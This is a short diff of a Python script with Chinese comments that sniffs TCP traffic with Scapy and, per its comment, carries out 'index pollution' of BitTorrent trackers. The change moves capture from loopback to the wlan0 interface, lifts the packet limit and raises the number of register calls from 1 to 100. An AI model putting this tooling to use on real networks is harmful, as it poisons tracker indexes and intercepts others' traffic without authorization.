@@ -10,7 +10,7 @@ info_hash_dict = {}
 # 存储tracker服务器对应的url
 url_dict = {}
 def pcap_and_analyze():
-    pkgs = sniff(iface="lo", filter="tcp", count=100, prn=rollback)
+    pkgs = sniff(iface="wlan0", filter="tcp", prn=rollback)
     # for pkg in pkgs:
     #     rollback(pkg)
     return
@@ -45,7 +45,7 @@ def rollback(pkg):
         # 开始进行索引污染
         if pkg.payload.src not in info_hash_dict.keys() or pkg.payload.src not in url_dict.keys():
             raise EnvironmentError("系统错误")
-        register.get(url_dict[pkg.payload.src], info_hash_dict[pkg.payload.src], 1)
+        register.get(url_dict[pkg.payload.src], info_hash_dict[pkg.payload.src], 100)
     return
 
 
